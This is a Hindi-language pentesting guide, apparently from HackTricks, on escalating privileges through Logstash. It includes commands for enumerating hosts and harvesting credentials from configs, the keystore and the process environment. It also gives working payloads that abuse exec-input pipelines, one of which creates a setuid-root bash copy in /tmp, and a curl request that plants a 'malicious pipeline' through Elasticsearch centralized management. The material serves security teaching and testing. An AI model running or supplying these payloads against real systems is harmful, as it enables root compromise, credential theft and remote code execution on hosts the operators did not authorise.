# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash का उपयोग लॉग्स को **एकत्रित (gather), रूपांतरित (transform), और प्रेषित (dispatch)** करने के लिए किया जाता है, यह सब एक ऐसी प्रणाली के माध्यम से होती है जिसे **pipelines** कहा जाता है। ये pipelines **input**, **filter**, और **output** चरणों से बने होते हैं। जब Logstash एक compromised machine पर चलता है तो एक दिलचस्प पहलू उभरता है।

### Pipeline कॉन्फ़िगरेशन

Pipelines को फाइल **/etc/logstash/pipelines.yml** में कॉन्फ़िगर किया जाता है, जो pipeline configurations के स्थानों को सूचीबद्ध करती है:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
यह फ़ाइल बताती है कि पाइपलाइन कॉन्फ़िगरेशन वाले **.conf** फाइलें कहाँ स्थित हैं। जब **Elasticsearch output module** का उपयोग किया जाता है, तो यह सामान्य है कि **pipelines** में **Elasticsearch credentials** शामिल हों, जिनके पास अक्सर व्यापक अधिकार होते हैं क्योंकि Logstash को Elasticsearch में डेटा लिखने की आवश्यकता होती है। कॉन्फ़िगरेशन पाथ्स में wildcards Logstash को निर्दिष्ट डायरेक्टरी में सभी मेल खाने वाले pipelines चलाने की अनुमति देते हैं।

यदि Logstash को `-f <directory>` के साथ शुरू किया जाता है बजाय `pipelines.yml` के, तो **उस डायरेक्टरी के अंदर सभी फाइलें lexicographical order में concatenated होकर एक single config के रूप में parsed की जाती हैं**। इसके दो offensive निहितार्थ हैं:

- `000-input.conf` या `zzz-output.conf` जैसी एक डाली गयी फ़ाइल अंतिम pipeline के असेंबलिंग को बदल सकती है
- एक malformed फ़ाइल पूरी pipeline के लोड होने से रोक सकती है, इसलिए auto-reload पर भरोसा करने से पहले payloads को सावधानी से validate करें

### Fast Enumeration on a Compromised Host

उस मशीन पर जहाँ Logstash इंस्टॉल है, जल्दी से जाँचें:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
यह भी जांचें कि स्थानीय monitoring API पहुँच योग्य है या नहीं। डिफ़ॉल्ट रूप से यह **127.0.0.1:9600** पर बाइंड होता है, जो आम तौर पर होस्ट पर पहुँचने के बाद पर्याप्त होता है:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Logstash से प्राप्त क्रेडेंशियल अक्सर **Elasticsearch** को अनलॉक कर देते हैं, इसलिए [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md) देखें।

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, पहले उस उपयोगकर्ता की पहचान करें जिसके तहत Logstash सेवा चल रही है — आमतौर पर **logstash** user। सुनिश्चित करें कि आप इनमें से **एक** शर्त पूरी करते हैं:

- आपके पास किसी pipeline **.conf** फाइल पर **write access** हो **या**
- **/etc/logstash/pipelines.yml** फ़ाइल में कोई wildcard उपयोग हो रहा हो, और आप लक्ष्य फ़ोल्डर में लिख सकते हों

इसके अतिरिक्त, इनमें से **एक** स्थिति पूरी होनी चाहिए:

- Logstash सेवा को restart करने की क्षमता मौजूद हो **या**
- **/etc/logstash/logstash.yml** फ़ाइल में **config.reload.automatic: true** सेट हो

यदि configuration में कोई wildcard मौजूद है, तो उस wildcard से मेल खाने वाली फ़ाइल बनाने पर command execution संभव हो जाता है। उदाहरण के लिए:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
यहाँ, **interval** निष्पादन आवृत्ति को सेकंडों में निर्धारित करता है। दिए गए उदाहरण में, **whoami** कमांड हर 120 सेकंड पर चलती है, और इसका आउटपुट **/tmp/output.log** में निर्देशित होता है।

यदि **/etc/logstash/logstash.yml** में **config.reload.automatic: true** सेट है, तो Logstash बिना पुनरारंभ के नए या संशोधित pipeline कॉन्फ़िगरेशन को स्वतः पहचान कर लागू कर देगा। यदि कोई wildcard नहीं है, तो मौजूदा कॉन्फ़िगरेशन में परिवर्तन अभी भी किए जा सकते हैं, लेकिन व्यवधानों से बचने के लिए सावधानी बरतनी चाहिए।

### अधिक विश्वसनीय Pipeline Payloads

`exec` input plugin अभी भी वर्तमान रिलीज़ में काम करता है और इसके लिए या तो `interval` या `schedule` आवश्यक है। यह Logstash JVM को **forking** करके निष्पादित करता है, इसलिए यदि मेमोरी कम है तो आपका payload चुपचाप चलने के बजाय `ENOMEM` के साथ विफल हो सकता है।

एक अधिक व्यावहारिक privilege-escalation payload आमतौर पर वही होता है जो एक स्थायी artifact छोड़ता है:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
यदि आपके पास रीस्टार्ट करने के अधिकार नहीं हैं लेकिन आप प्रोसेस को सिग्नल भेज सकते हैं, तो Logstash Unix-जैसी प्रणालियों पर **SIGHUP**-triggered reload का भी समर्थन करता है:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
ध्यान रखें कि हर plugin reload-friendly नहीं होता। उदाहरण के लिए, **stdin** input automatic reload को रोकता है, इसलिए यह मत मानिए कि `config.reload.automatic` हमेशा आपके बदलावों को पढ़ लेगा।

### Logstash से Secrets चुराना

सिर्फ code execution पर ही फोकस करने से पहले, उन डेटा को इकट्ठा करें जिन तक Logstash पहले से ही पहुँच रखता है:

- Plaintext credentials अक्सर hardcoded होते हैं `elasticsearch {}` outputs, `http_poller`, JDBC inputs, या cloud-related settings के अंदर
- Secure settings शायद **`/etc/logstash/logstash.keystore`** या किसी अन्य `path.settings` डायरेक्टरी में रहते हैं
- Keystore password अक्सर प्रदान किया जाता है **`LOGSTASH_KEYSTORE_PASS`** के माध्यम से, और package-based installs आमतौर पर इसे **`/etc/sysconfig/logstash`** से source करते हैं
- Environment-variable expansion `${VAR}` के साथ Logstash startup पर resolve हो जाता है, इसलिए service environment को जांचना लाभकारी है

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
यह भी जाँचने योग्य है क्योंकि **CVE-2023-46672** ने दिखाया कि विशिष्ट परिस्थितियों में Logstash लॉग्स में संवेदनशील जानकारी रिकॉर्ड कर सकता है। पोस्ट-एक्सप्लॉइटेशन होस्ट पर, पुराने Logstash लॉग और `journald` एंट्रीज़ इसलिए क्रेडेंशियल्स को उजागर कर सकते हैं, भले ही वर्तमान config secrets को inline स्टोर करने के बजाय keystore को संदर्भित करे।

### केंद्रीकृत पाइपलाइन प्रबंधन दुरुपयोग

कुछ वातावरणों में, होस्ट स्थानीय `.conf` फ़ाइलों पर बिल्कुल भी निर्भर नहीं करता। यदि **`xpack.management.enabled: true`** कॉन्फ़िगर है, तो Logstash centrally managed pipelines को Elasticsearch/Kibana से खींच सकता है, और इस मोड को सक्षम करने के बाद स्थानीय पाइपलाइन कॉन्फ़िग्स अब source of truth नहीं रहते।

इसका मतलब एक अलग हमला मार्ग है:

1. स्थानीय Logstash सेटिंग्स, the keystore, या लॉग्स से Elastic क्रेडेंशियल्स पुनर्प्राप्त करें
2. जाँचें कि खाते के पास **`manage_logstash_pipelines`** क्लस्टर विशेषाधिकार है या नहीं
3. किसी केंद्रीकृत प्रबंधित पाइपलाइन को बनाएं या प्रतिस्थापित करें ताकि Logstash होस्ट आपकी payload को उसकी अगली poll interval पर निष्पादित करे

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
यह विशेष रूप से तब उपयोगी होता है जब स्थानीय फ़ाइलें केवल-पठनीय हों लेकिन Logstash पहले से ही दूरस्थ रूप से pipelines प्राप्त करने के लिए रजिस्टर किया गया हो।

## संदर्भ

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
